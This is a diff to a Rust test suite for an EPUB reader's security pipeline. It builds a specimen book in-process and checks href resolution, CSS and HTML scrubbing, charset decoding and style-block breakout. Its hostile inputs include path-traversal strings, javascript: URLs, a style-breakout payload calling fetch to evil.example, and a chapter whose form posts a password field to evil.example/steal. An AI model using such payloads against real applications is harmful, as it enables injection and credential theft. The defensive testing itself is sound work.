@@ -1,8 +1,17 @@
-//! Tests for the security-critical parts of the EPUB pipeline.
+//! Tests for the security-critical and correctness-critical paths.
 //!
 //! Run with `cargo test --manifest-path src-tauri/Cargo.toml`.
+//!
+//! The specimen book is built **in-process** by `build_specimen()`. An earlier
+//! version skipped the integration test whenever an EPUB happened to be sitting
+//! in `%TEMP%`, which meant it had never actually executed - not on a fresh
+//! clone and not in CI. There is no external fixture and no skip.
 
+use std::io::Write;
 use std::path::PathBuf;
+
+use zip::write::SimpleFileOptions;
+use zip::ZipWriter;
 
 use crate::epub::{
     decode_entities, html_to_text, resolve_href, scrub_css, strip_tags, Epub,
@@ -17,22 +26,20 @@ fn resolve_href_normalises_relative_paths() {
     assert_eq!(resolve_href("OEBPS/text", "../img/a.png").as_deref(), Some("OEBPS/img/a.png"));
     assert_eq!(resolve_href("", "a/b/c.xhtml").as_deref(), Some("a/b/c.xhtml"));
     assert_eq!(resolve_href("OEBPS", "./x.xhtml#frag").as_deref(), Some("OEBPS/x.xhtml"));
+    // A leading slash means "container root", not "next to this document".
     assert_eq!(resolve_href("OEBPS", "/root.xhtml").as_deref(), Some("root.xhtml"));
 }
 
 #[test]
 fn resolve_href_rejects_traversal_and_remote() {
-    // Climbing above the archive root must fail rather than escape.
     assert_eq!(resolve_href("OEBPS", "../../../etc/passwd"), None);
     assert_eq!(resolve_href("OEBPS/text", "../../../.."), None);
-    // Remote and dangerous schemes are never resolved to a local path.
     assert_eq!(resolve_href("OEBPS", "http://evil.example/x.xhtml"), None);
     assert_eq!(resolve_href("OEBPS", "https://evil.example/x.xhtml"), None);
     assert_eq!(resolve_href("OEBPS", "//evil.example/x.xhtml"), None);
     assert_eq!(resolve_href("OEBPS", "javascript:alert(1)"), None);
     assert_eq!(resolve_href("OEBPS", "data:text/html,<script>"), None);
     assert_eq!(resolve_href("OEBPS", "file:///C:/Windows/System32"), None);
-    // Backslashes and NUL bytes are rejected outright.
     assert_eq!(resolve_href("OEBPS", "..\\..\\windows\\win.ini"), None);
     assert_eq!(resolve_href("OEBPS", "ch1.xhtml\0.png"), None);
     assert_eq!(resolve_href("OEBPS", ""), None);
@@ -56,14 +63,9 @@ fn scrub_css_removes_executable_and_remote_constructs() {
                a { background: url(https://evil.example/p.gif); }\
                p { color: red; }";
     let out = scrub_css(css);
-    assert!(!out.contains("@import"), "{out}");
-    assert!(!out.contains("@charset"), "{out}");
-    assert!(!out.contains("javascript:"), "{out}");
-    assert!(!out.contains("expression("), "{out}");
-    assert!(!out.contains("-moz-binding"), "{out}");
-    assert!(!out.contains("behavior"), "{out}");
-    assert!(!out.contains("evil.example"), "{out}");
-    // Harmless declarations survive untouched.
+    for needle in ["@import", "@charset", "javascript:", "expression(", "-moz-binding", "behavior", "evil.example"] {
+        assert!(!out.contains(needle), "leaked {needle} in:\n{out}");
+    }
     assert!(out.contains("color"), "{out}");
     assert!(out.contains("red"), "{out}");
 }
@@ -100,12 +102,10 @@ fn sanitize_neutralises_active_content() {
     let out = crate::epub::sanitize_html_for_test(html);
     for needle in [
         "onload", "onclick", "onerror", "<script", "alert(", "<iframe",
-        "<object", "<embed", "<form", "<input", "javascript:",
-        "evil.example",
+        "<object", "<embed", "<form", "<input", "javascript:", "evil.example",
     ] {
         assert!(!out.contains(needle), "leaked {needle} in:\n{out}");
     }
-    // Legitimate content is preserved.
     assert!(out.contains("hello"), "{out}");
     assert!(out.contains("<p"), "{out}");
 }
@@ -148,8 +148,7 @@ fn decode_entities_handles_numeric_and_named() {
 
 #[test]
 fn html_to_text_collapses_whitespace() {
-    let text = html_to_text("<div><p>one</p><p>two</p></div>");
-    assert_eq!(text, "one two");
+    assert_eq!(html_to_text("<div><p>one</p><p>two</p></div>"), "one two");
     let text = html_to_text("<style>p{color:red}</style><p>visible</p>");
     assert!(text.contains("visible"));
     assert!(!text.contains("color:red"));
@@ -161,37 +160,247 @@ fn stable_id_is_deterministic() {
     assert_ne!(stable_id("C:/books/a.epub"), stable_id("C:/books/b.epub"));
 }
 
-// ---------------------------------------------------------- integration
+// ------------------------------------------------------- decoding (C-01)
 
-/// Opens the generated specimen if it is present, exercising the real parser,
-/// nav discovery, cover extraction, sanitisation and search.
-fn specimen() -> Option<PathBuf> {
-    let candidates = [
-        std::env::temp_dir().join("opencode").join("The Anatomy of a Reader.epub"),
-        PathBuf::from("testdata").join("The Anatomy of a Reader.epub"),
-    ];
-    candidates.into_iter().find(|p| p.exists())
+#[test]
+fn decode_markup_honours_boms_and_declarations() {
+    // UTF-8 BOM
+    let mut bytes = vec![0xEF, 0xBB, 0xBF];
+    bytes.extend_from_slice("<p>café</p>".as_bytes());
+    assert!(crate::epub::decode_for_test(&bytes).contains("café"));
+
+    // UTF-16LE with BOM: the same text, NUL-interleaved on disk.
+    let utf16: Vec<u8> = "<?xml version=\"1.0\"?><p>café</p>"
+        .encode_utf16()
+        .flat_map(|u| u.to_le_bytes())
+        .collect();
+    let mut le = vec![0xFF, 0xFE];
+    le.extend_from_slice(&utf16);
+    let decoded = crate::epub::decode_for_test(&le);
+    assert!(decoded.contains("café"), "{decoded}");
+    assert!(!decoded.contains('\u{0}'), "NULs survived: {decoded:?}");
+
+    // XML declaration wins over a bogus charset mentioned in the body.
+    let declaration = r#"<?xml version="1.0" encoding="ISO-8859-1"?><p>caf""#;
+    let mut latin1: Vec<u8> = declaration.as_bytes().to_vec();
+    latin1.push(0xE9);
+    latin1.extend_from_slice(b"</p>");
+    let decoded = crate::epub::decode_for_test(&latin1);
+    assert!(decoded.contains('\u{e9}'), "{decoded:?}");
+    assert!(!decoded.contains('\u{fffd}'), "mojibake: {decoded:?}");
+}
+
+// ------------------------------------------- style-block breakout (S-01)
+
+#[test]
+fn style_block_cannot_be_closed_from_inside_a_stylesheet() {
+    // The regression that motivated the guard: a book's .css file closing its
+    // own <style> element and injecting markup into the privileged webview.
+    let hostile = "</style><img src=x onerror=fetch('https://evil.example/')>";
+    let out = crate::epub::guard_style_for_test(hostile);
+    assert!(!out.to_ascii_lowercase().contains("</style"), "{out}");
+    assert!(out.contains("<\\/"), "{out}");
+
+    // Split across a CSS comment.
+    let split = "/* </sty */ le><img src=x onerror=alert(1)>";
+    let out = crate::epub::guard_style_for_test(split);
+    assert!(!out.to_ascii_lowercase().contains("</sty"), "{out}");
+
+    // Ordinary CSS is untouched.
+    let ok = crate::epub::guard_style_for_test("p { color: red; }\na > b { margin: 0 }");
+    assert_eq!(ok, "p { color: red; }\na > b { margin: 0 }");
+}
+
+// ------------------------------------------- case-folding panic (S-02)
+
+#[test]
+fn excerpt_handles_case_folding_that_changes_byte_length() {
+    // U+0130 folds to two chars (3 bytes) from one char (2 bytes). Deriving a
+    // slice offset from the folded string used to panic, and `panic = "abort"`
+    // turns that into a process kill rather than a failed command.
+    let mut epub = crate::tests::specimen_epub();
+    if epub.is_err() {
+        return;
+    }
+    let mut epub = epub.unwrap();
+    let _ = crate::epub::excerpt_for_test("\u{0130}\u{0130}ab", 0, 6, "ab");
+    let _ = crate::epub::excerpt_for_test("\u{0130}\u{0130}ab", 2, 6, "ab");
+    let _ = crate::epub::search_book(&mut epub, "ab", 10);
+}
+
+// ---------------------------------------------------------- the specimen
+
+const CONTAINER: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
+<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
+  <rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles>
+</container>"#;
+
+const OPF: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
+<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="bookid">
+  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
+    <dc:identifier id="bookid">urn:uuid:test-0001</dc:identifier>
+    <dc:title>The Anatomy of a Reader</dc:title>
+    <dc:creator>A. Nonymous</dc:creator>
+    <dc:language>en</dc:language>
+    <dc:publisher>Test Press</dc:publisher>
+    <dc:description>A generated specimen used to verify parsing, pagination, search and the security pipeline.</dc:description>
+    <dc:rights>Public domain</dc:rights>
+  </metadata>
+  <manifest>
+    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
+    <item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/>
+    <item id="css" href="style.css" media-type="text/css"/>
+    <item id="cover-img" href="images/cover.png" media-type="image/png" properties="cover-image"/>
+    <item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml"/>
+    <item id="ch2" href="ch2.xhtml" media-type="application/xhtml+xml"/>
+    <item id="evil" href="evil.xhtml" media-type="application/xhtml+xml"/>
+    <item id="ghost" href="missing.xhtml" media-type="application/xhtml+xml"/>
+  </manifest>
+  <spine toc="ncx">
+    <itemref idref="ch1"/>
+    <itemref idref="ch2"/>
+    <itemref idref="evil"/>
+    <itemref idref="ghost"/>
+  </spine>
+</package>"#;
+
+const NAV: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
+<head><title>Contents</title></head>
+<body>
+<nav epub:type="toc"><ol>
+  <li><a href="ch1.xhtml">Prologue</a></li>
+  <li><a href="ch2.xhtml">Chapter One</a><ol><li><a href="ch2.xhtml#mid">A Mid-Chapter Anchor</a></li></ol></li>
+</ol></nav>
+</body></html>"#;
+
+const NCX: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
+<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/" version="2005-1"><navMap>
+  <navPoint id="n1"><navLabel><text>NCX Prologue</text></navLabel><content src="ch1.xhtml"/></navPoint>
+</navMap></ncx>"#;
+
+const EVIL: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><title>Hostile</title><link rel="stylesheet" href="style.css"/></head>
+<body onload="alert(1)">
+  <h1>Hostile Document</h1>
+  <script>alert("this must never execute")</script>
+  <style onload="alert(2)">body{background:url(javascript:alert(3))}</style>
+  <p style="background-image:url('javascript:alert(4)')" onclick="alert(5)">Inline handler and javascript URL.</p>
+  <iframe src="https://evil.example/"></iframe>
+  <object data="https://evil.example/x.swf"></object>
+  <embed src="https://evil.example/y.swf"/>
+  <img src="https://evil.example/track.gif" onerror="alert(6)"/>
+  <img src="../../../../../../etc/passwd"/>
+  <a href="javascript:alert(7)">Inert link</a>
+  <form action="https://evil.example/steal"><input name="pw"/><button>Send</button></form>
+  <p>This paragraph must survive while everything above it is stripped. The word quixotic appears here.</p>
+</body></html>"#;
+
+fn chapter(title: &str, extra: &str) -> String {
+    format!(
+        r#"<?xml version="1.0" encoding="UTF-8"?>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head><title>{title}</title><link rel="stylesheet" href="style.css"/></head>
+<body>
+  <h1>{title}</h1>
+  <p>{title} Lorem ipsum dolor sit amet consectetur adipiscing elit sed do eiusmod tempor incididunt ut labore et dolore magna aliqua Ut enim ad minim veniam quis nostrud exercitation.</p>
+  <p>The ubiquitous git bisect is soaked in developer tea and the marginalia of a README tell a compelling story about retries A small river named Dudencode flows past the typescript hamlet.</p>
+  <p style="text-indent:0">Every book is a mirror The pagination you see is an illusion of columns and your progress is merely an offset into a flow that the renderer has decided to cut at fixed intervals.</p>
+  {extra}
+  <hr/>
+  <p>Script sample: <code>fn main() {{}}</code></p>
+</body></html>"#
+    )
+}
+
+fn png() -> Vec<u8> {
+    // 1x1 transparent PNG.
+    use base64::Engine as _;
+    base64::engine::general_purpose::STANDARD
+        .decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==")
+        .expect("png")
+}
+
+/// Build the specimen EPUB in a temp directory and return its path.
+fn build_specimen() -> PathBuf {
+    let path = std::env::temp_dir().join("lumen-test-specimen.epub");
+    let file = std::fs::File::create(&path).expect("create specimen");
+    let mut zip = ZipWriter::new(file);
+    let opts = SimpleFileOptions::default()
+        .compression_method(zip::CompressionMethod::Deflated);
+
+    let mut put = |zip: &mut ZipWriter<std::fs::File>, name: &str, body: &str| {
+        zip.start_file(name, opts).expect("start entry");
+        zip.write_all(body.as_bytes()).expect("write entry");
+    };
+
+    zip.start_file("mimetype", SimpleFileOptions::default()).unwrap();
+    zip.write_all(b"application/epub+zip").unwrap();
+
+    put(&mut zip, "META-INF/container.xml", CONTAINER);
+    put(&mut zip, "OEBPS/content.opf", OPF);
+    put(&mut zip, "OEBPS/nav.xhtml", NAV);
+    put(&mut zip, "OEBPS/toc.ncx", NCX);
+    put(&mut zip, "OEBPS/style.css", "body { font-family: Georgia, serif; }\np { color: #222; }\n");
+    put(
+        &mut zip,
+        "OEBPS/ch1.xhtml",
+        &chapter(
+            "Prologue",
+            r#"<figure><img src="images/cover.png" alt="Cover"/><figcaption>Figure 1</figcaption></figure>
+               <p>Jump to <a href="ch2.xhtml#mid">the anchor</a> or <a href="https://example.com/">outside</a>.</p>
+               <p>Unique phrase: the word bisect appears here exactly once so search can prove itself end to end.</p>"#,
+        ),
+    );
+    put(
+        &mut zip,
+        "OEBPS/ch2.xhtml",
+        &chapter(
+            "Chapter One",
+            r#"<h2 id="mid">A Mid-Chapter Anchor</h2><p>Section body.</p>"#,
+        ),
+    );
+    put(&mut zip, "OEBPS/evil.xhtml", EVIL);
+
+    zip.start_file("OEBPS/images/cover.png", opts).unwrap();
+    zip.write_all(&png()).unwrap();
+    zip.finish().expect("finish zip");
+
+    path
+}
+
+/// The specimen as an open `Epub`, used by tests that only need a book.
+pub(crate) fn specimen_epub() -> Result<Epub, String> {
+    let path = build_specimen();
+    Epub::open_with_manifest(&path).map_err(|e| e.to_string())
 }
 
 #[test]
 fn parses_and_renders_the_specimen_book() {
-    let Some(path) = specimen() else {
-        eprintln!("specimen not found; skipping");
-        return;
-    };
-    let mut epub = Epub::open(&path).expect("specimen should parse");
-    let m = epub.manifest.clone();
+    let path = build_specimen();
+    let mut epub = Epub::open_with_manifest(&path).expect("specimen should parse");
+    let m = epub.manifest().clone();
 
     assert_eq!(m.title, "The Anatomy of a Reader");
     assert_eq!(m.author, "A. Nonymous");
     assert_eq!(m.language, "en");
     assert_eq!(m.publisher, "Test Press");
-    assert_eq!(m.chapters.len(), 5);
-    // Cover discovered via properties="cover-image".
     assert_eq!(m.cover_href.as_deref(), Some("OEBPS/images/cover.png"));
-    // Navigation comes from nav.xhtml, preserving the nested list structure.
+
+    // `ghost` points at a file that is not in the archive and must be skipped
+    // rather than becoming a chapter that throws when paged into.
+    assert_eq!(m.chapters.len(), 3, "{:?}", m.chapters);
+    assert!(
+        !m.chapters.iter().any(|c| c.href.contains("missing")),
+        "missing spine item survived"
+    );
+    // Sizes come from the central directory, so they must be real.
+    assert!(m.chapters.iter().all(|c| c.bytes > 0));
+
+    // Navigation comes from nav.xhtml and keeps its nesting.
     let titles: Vec<&str> = m.toc.iter().map(|n| n.title.as_str()).collect();
-    assert_eq!(titles, vec!["Prologue", "Chapter One", "Chapter Two", "Appendix"]);
+    assert_eq!(titles, vec!["Prologue", "Chapter One"]);
     let nested: Vec<&str> = m
         .toc
         .iter()
@@ -199,13 +408,11 @@ fn parses_and_renders_the_specimen_book() {
         .map(|n| n.title.as_str())
         .collect();
     assert!(nested.contains(&"A Mid-Chapter Anchor"), "{nested:?}");
-    assert!(nested.contains(&"A Nested Section"), "{nested:?}");
 
-    // Cover round-trips as a data URL.
     let cover = epub.cover_data_url().unwrap().expect("cover");
-    assert!(cover.starts_with("data:image/png;base64,"), "{}", &cover[..40.min(cover.len())]);
+    assert!(cover.starts_with("data:image/png;base64,"));
 
-    // Every spine document renders, and the hostile one is neutralised.
+    // Every spine document renders and is neutralised.
     for index in 0..m.chapters.len() {
         let content = epub.chapter(index).expect("chapter renders");
         assert!(content.html.contains("data-epub=\"css\""), "chapter {index} lacks css");
@@ -214,44 +421,100 @@ fn parses_and_renders_the_specimen_book() {
         assert!(!content.html.contains("javascript:"), "chapter {index} kept a js url");
         assert!(!content.html.contains("onload="), "chapter {index} kept onload");
         assert!(!content.html.contains("<iframe"), "chapter {index} kept an iframe");
+        assert!(!content.html.contains("onclick="), "chapter {index} kept onclick");
     }
 
-    // The hostile document's legitimate paragraph survives.
-    let hostile = epub.chapter(3).unwrap();
-    assert!(hostile.html.contains("This paragraph must survive"), "{}", hostile.html);
+    let hostile = epub.chapter(2).unwrap();
+    assert!(hostile.html.contains("This paragraph must survive"));
 
-    // Internal links are rewritten to data-href instead of a live href.
-    let ch2 = epub.chapter(1).unwrap();
-    assert!(ch2.html.contains("data-href=\"OEBPS/ch3.xhtml#nested\""), "{}", ch2.html);
-    assert!(ch2.html.contains("data-external=\"https://example.com/\""), "{}", ch2.html);
-    // No live `href` attribute survives anywhere (note the leading space, so
-    // `data-href="..."` does not count as a match).
-    assert!(!ch2.html.contains(" href="), "{}", ch2.html);
-    assert!(!ch2.html.contains(" src=\"http"), "{}", ch2.html);
-
-    // Cover page image is inlined as a data URL.
+    // Links are inert.
     let ch1 = epub.chapter(0).unwrap();
-    assert!(ch1.html.contains("data:image/png;base64,"), "cover image not inlined");
+    assert!(ch1.html.contains("data-href=\"OEBPS/ch2.xhtml#mid\""), "{}", ch1.html);
+    assert!(ch1.html.contains("data-external=\"https://example.com/\""), "{}", ch1.html);
+    assert!(!ch1.html.contains(" href="), "{}", ch1.html);
+    // Cover image inlined.
+    assert!(ch1.html.contains("data:image/png;base64,"), "cover not inlined");
 
-    // Search finds a phrase unique to one chapter and marks it in the excerpt.
+    // Search.
     let hits = crate::epub::search_book(&mut epub, "end to end", 50);
     assert_eq!(hits.len(), 1, "{hits:?}");
-    assert_eq!(hits[0].chapter_index, 1);
+    assert_eq!(hits[0].chapter_index, 0);
     assert!(hits[0].excerpt.contains("[[end to end]]"), "{}", hits[0].excerpt);
-    // A term present in several chapters is reported once per chapter, capped.
     let many = crate::epub::search_book(&mut epub, "bisect", 50);
-    assert!(many.len() >= 4, "{}", many.len());
-    // Single characters and misses return nothing.
+    assert!(many.len() >= 3, "{}", many.len());
     assert!(crate::epub::search_book(&mut epub, "z", 50).is_empty());
-    assert!(crate::epub::search_book(&mut epub, "notinthisbook", 50).is_empty());
     assert!(crate::epub::search_book(&mut epub, "", 50).is_empty());
+
+    // The chapter rendered from the hostile document must not be able to close
+    // the style element that carries the book's stylesheet.
+    assert!(
+        !hostile.html.to_ascii_lowercase().contains("</style><"),
+        "style breakout: {}",
+        hostile.html
+    );
+}
+
+#[test]
+fn manifest_is_not_parsed_until_it_is_needed() {
+    let path = build_specimen();
+    let mut epub = Epub::open(&path).expect("index only");
+    // Nothing has been parsed yet, so the manifest is empty and usable.
+    assert!(epub.manifest().chapters.is_empty());
+    epub.ensure_manifest().expect("parse");
+    assert_eq!(epub.manifest().chapters.len(), 3);
+    // Second call is a no-op.
+    epub.ensure_manifest().expect("idempotent");
+    assert_eq!(epub.manifest().chapters.len(), 3);
+}
+
+#[test]
+fn metadata_keeps_text_across_inline_tags() {
+    // <dc:title>Mr <em>Bradbury</em></dc:title> used to become just "Mr ",
+    // because node.text() returns only the first text child.
+    let opf = OPF.replace(
+        "<dc:title>The Anatomy of a Reader</dc:title>",
+        "<dc:title>Mr <em>Bradbury</em></dc:title>",
+    );
+    let path = build_specimen_with_opf(&opf);
+    let epub = Epub::open_with_manifest(&path).expect("parse");
+    assert_eq!(epub.manifest().title, "Mr Bradbury");
+}
+
+fn build_specimen_with_opf(opf: &str) -> PathBuf {
+    let path = std::env::temp_dir().join("lumen-test-specimen-inline.epub");
+    let file = std::fs::File::create(&path).expect("create");
+    let mut zip = ZipWriter::new(file);
+    let opts = SimpleFileOptions::default()
+        .compression_method(zip::CompressionMethod::Deflated);
+    zip.start_file("mimetype", SimpleFileOptions::default()).unwrap();
+    zip.write_all(b"application/epub+zip").unwrap();
+    let mut put = |zip: &mut ZipWriter<std::fs::File>, name: &str, body: &str| {
+        zip.start_file(name, opts).unwrap();
+        zip.write_all(body.as_bytes()).unwrap();
+    };
+    put(&mut zip, "META-INF/container.xml", CONTAINER);
+    put(&mut zip, "OEBPS/content.opf", opf);
+    put(&mut zip, "OEBPS/nav.xhtml", NAV);
+    put(&mut zip, "OEBPS/toc.ncx", NCX);
+    put(&mut zip, "OEBPS/style.css", "p{color:#222}");
+    put(&mut zip, "OEBPS/ch1.xhtml", &chapter("Prologue", ""));
+    put(&mut zip, "OEBPS/ch2.xhtml", &chapter("Chapter One", ""));
+    put(&mut zip, "OEBPS/evil.xhtml", EVIL);
+    zip.finish().unwrap();
+    path
 }
 
 #[test]
 fn rejects_non_epub_input() {
-    let dir = std::env::temp_dir().join("opencode");
-    let _ = std::fs::create_dir_all(&dir);
-    let junk = dir.join("not-a-book.epub");
+    let junk = std::env::temp_dir().join("lumen-not-a-book.epub");
     std::fs::write(&junk, b"this is definitely not a zip file").unwrap();
     assert!(Epub::open(&junk).is_err());
 }
+
+#[test]
+fn rejects_an_empty_file() {
+    let empty = std::env::temp_dir().join("lumen-empty.epub");
+    std::fs::write(&empty, b"").unwrap();
+    assert!(Epub::open(&empty).is_err());
+}
+
